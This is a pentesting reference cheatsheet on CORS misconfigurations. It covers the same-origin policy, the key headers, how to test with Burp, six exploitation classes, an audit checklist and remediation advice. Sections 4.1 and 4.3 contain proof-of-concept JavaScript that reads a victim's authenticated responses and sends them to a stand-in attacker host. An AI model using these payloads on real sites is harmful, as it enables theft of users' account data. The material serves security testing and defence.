# CORS Cheatsheet (Pentesting Reference)

## Table of Contents

- [1. Core concepts](#1-core-concepts)
- [2. Key headers](#2-key-headers)
- [3. How to test / spot CORS in the wild](#3-how-to-test--spot-cors-in-the-wild)
- [4. Misconfiguration classes & exploitation](#4-misconfiguration-classes--exploitation)
  - [4.1 Origin reflected verbatim (trust-anyone)](#41-origin-reflected-verbatim-trust-anyone)
  - [4.2 Sloppy allowlist parsing (prefix/suffix matching)](#42-sloppy-allowlist-parsing-prefixsuffix-matching)
  - [4.3 `null` origin whitelisted](#43-null-origin-whitelisted)
  - [4.4 XSS on a trusted origin → CORS pivot](#44-xss-on-a-trusted-origin--cors-pivot)
  - [4.5 Trusted HTTP origin breaks TLS](#45-trusted-http-origin-breaks-tls)
  - [4.6 Intranet / internal targets with wildcard, no credentials](#46-intranet--internal-targets-with-wildcard-no-credentials)
- [5. Quick checklist when auditing an app](#5-quick-checklist-when-auditing-an-app)
- [6. Prevention (for writeups / remediation notes)](#6-prevention-for-writeups--remediation-notes)

## 1. Core concepts

- **SOP (Same-Origin Policy)**: default browser rule — JS on one origin can't *read* responses from another origin. Origin = scheme + domain + port, all three must match.
- **CORS**: a controlled way to relax SOP. Server tells the browser "origin X may read my response" via response headers.
- **SOP blocks reading, not sending/loading.** `<img>`, `<script src>`, `<video>` still load cross-origin fine — SOP only stops JS from reading the response content. Cross-origin *forms* and simple requests still get sent (with cookies) — the browser just won't let JS read what comes back unless CORS allows it.
- **CORS ≠ CSRF protection.** CORS governs whether a script can *read* a cross-origin response. It does nothing to stop the browser from *sending* a request with cookies attached — that's CSRF's whole premise. A broken CORS setup can make things worse, but fixing CORS doesn't fix CSRF and vice versa.
- **Cookies leak looser than SOP** — shared across all subdomains by default. `HttpOnly` stops JS reading them, but doesn't stop them being sent.

## 2. Key headers

| Header | Meaning |
|---|---|
| `Origin` (request) | Origin the request came from — browser sets this, can't be spoofed by page JS but attacker fully controls it from their own site |
| `Access-Control-Allow-Origin` (ACAO) | Server says which origin may read the response |
| `Access-Control-Allow-Credentials: true` | Allows cookies/auth to be sent + response read on a credentialed cross-origin request |
| `Access-Control-Allow-Methods` / `-Headers` | Preflight response: what methods/headers are permitted |
| `Access-Control-Max-Age` | How long browser can cache the preflight result |

**Wildcard rule:** `Access-Control-Allow-Origin: *` can NOT be combined with `Access-Control-Allow-Credentials: true` (browsers block this combo). This is why servers that want both wildcard-like flexibility *and* credentials often fall back to dynamically reflecting the `Origin` header — which is the root of most CORS vulns.

**Preflight** (`OPTIONS`) fires for "non-simple" requests — custom headers, non-standard content-types, methods like `PUT`/`DELETE`. Simple `GET`/`POST` with standard headers skip preflight; the real request goes out immediately and the browser only decides afterward whether JS can read the response.

## 3. How to test / spot CORS in the wild

1. Take any request, send it through Burp Repeater.
2. Add/modify `Origin: https://arbitrary-attacker-domain.com`.
3. Send, inspect response headers:
   - Is `Access-Control-Allow-Origin` present at all?
   - Does it **reflect** your arbitrary origin back verbatim? → red flag.
   - Is `Access-Control-Allow-Credentials: true` also present? → if combined with reflection, likely exploitable.
4. For state-sensitive/non-simple requests, check the `OPTIONS` preflight response too (`Access-Control-Allow-Methods`, `-Headers`).

## 4. Misconfiguration classes & exploitation

### 4.1 Origin reflected verbatim (trust-anyone)
Server just echoes whatever `Origin` it receives instead of checking an allowlist.

```
Origin: https://malicious-website.com
```
```
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

PoC (steal authenticated response, exfil via redirect):
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://TARGET/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://ATTACKER-SERVER/log?key='+this.responseText;
    };
</script>
```

### 4.2 Sloppy allowlist parsing (prefix/suffix matching)
- **Suffix match bug**: allows anything *ending in* `normal-website.com` → attacker registers `hackersnormal-website.com`.
- **Prefix match bug**: allows anything *starting with* `normal-website.com` → attacker registers `normal-website.com.evil-user.net`.
- Also check regex-based allowlists for unescaped `.` (matches any char) or missing anchors.

### 4.3 `null` origin whitelisted
Browsers send `Origin: null` for sandboxed iframes, `data:` URIs, `file://`, some redirect chains. If the server trusts `null`, attacker can force it deliberately:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://TARGET/sensitive-data',true);
req.withCredentials = true;
req.send();
function reqListener() { location='https://ATTACKER/log?key='+this.responseText; };
</script>"></iframe>
```

### 4.4 XSS on a trusted origin → CORS pivot
Even a correctly-scoped CORS config (e.g. trusting `subdomain.target.com` specifically) is only as strong as that trusted origin's own security. If the trusted subdomain has XSS, attacker injects script there, and that script — now running *as* the trusted origin — makes the authenticated CORS request itself and reads the response. The main site can't distinguish this from a legitimate call.

Relevant when auditing: **check every origin the app trusts for its own vulnerabilities (esp. XSS)**, not just the target host.

### 4.5 Trusted HTTP origin breaks TLS
If a site whitelists an origin reachable over **plain HTTP** (even a subdomain), a network-position attacker (public wifi, MITM) can:
1. Intercept any plaintext HTTP request from the victim.
2. Redirect it to the trusted HTTP origin.
3. Intercept that request too, serve a malicious page from that origin.
4. That page fires an authenticated CORS request to the HTTPS target, using the trusted origin.
5. Attacker reads the response.

Applies even if the target itself is 100% HTTPS with `Secure` cookies — the weak link is trusting *any* origin reachable over HTTP.

### 4.6 Intranet / internal targets with wildcard, no credentials
`Access-Control-Allow-Origin: *` without credentials looks harmless externally (attacker only gets unauthenticated/public data anyway) — **unless** the target isn't reachable by the attacker directly (internal/intranet host). Then:
1. Victim (on the internal network) visits attacker's public site.
2. Victim's browser can reach the intranet host; attacker's browser can't.
3. Attacker's JS issues a CORS request to the intranet host from the victim's browser.
4. Wildcard ACAO lets the browser hand the response back to attacker JS — victim becomes an unwitting proxy into a network the attacker could never reach directly.

## 5. Quick checklist when auditing an app

- [ ] Does the server ever reflect `Origin` verbatim in `Access-Control-Allow-Origin`?
- [ ] Is `Access-Control-Allow-Credentials: true` present alongside a reflected/wildcard origin?
- [ ] Does the allowlist logic use prefix/suffix/regex matching that could be abused?
- [ ] Is `null` ever accepted as a trusted origin?
- [ ] Are any trusted origins (subdomains, partners) reachable over plain HTTP?
- [ ] Do any trusted origins have their own XSS or other injection vulns?
- [ ] For internal-only apps: is `*` used anywhere, even without credentials?
- [ ] Does a sensitive endpoint also accept `GET` (easier to weaponize / no preflight)?

## 6. Prevention (for writeups / remediation notes)

- Use a strict, exact-match allowlist for `Access-Control-Allow-Origin` — never dynamically reflect `Origin` unchecked.
- Never whitelist `null`.
- Never combine wildcard with credentials (browsers block it, but don't rely on that — be explicit anyway).
- Don't use `*` on internal/intranet-facing endpoints, even without credentials.
- Treat every trusted origin as part of your attack surface — its security (esp. XSS) directly affects yours.
- Remember: CORS is a **browser-enforced** control. It does nothing against direct request forgery via `curl`/Burp/non-browser clients — it's not a substitute for real server-side auth and session checks.
